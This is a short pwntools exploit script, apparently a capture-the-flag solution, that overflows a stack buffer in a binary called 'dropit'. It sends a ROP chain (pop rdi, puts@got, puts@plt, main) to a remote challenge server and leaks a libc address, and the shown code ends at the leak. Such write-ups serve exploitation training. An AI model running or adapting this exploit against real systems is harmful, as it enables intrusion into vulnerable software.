#!/usr/bin/env python3
from pwn import *
import struct
import binascii

elf = ELF("./dropit")
rop = ROP(elf)

POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0] # 0x401203
PUTS_GOT = elf.got['puts'] # 0x403fc8
PUTS_PLT = elf.plt['puts'] # 0x401030
MAIN = elf.symbols['main'] # 0x401146

info("pop rdi gadget: %s" % hex(POP_RDI))
info("puts@got: %s" % hex(PUTS_GOT))
info("puts@plt: %s" % hex(PUTS_PLT))
info("main: %s" % hex(MAIN))

payload  = b'A' * 56
payload += p64(POP_RDI)
payload += p64(PUTS_GOT)
payload += p64(PUTS_PLT)
payload += p64(MAIN)

p = remote('challenges.ctfd.io', 30261)

p.recvline()
p.sendline(payload)
puts_remote_raw = p.recv()
p.recvline()

remote_leak = struct.unpack("<Q", puts_remote_raw.ljust(8, b'\x00'))[0]
info("leaked libc address: %s" % hex(remote_leak))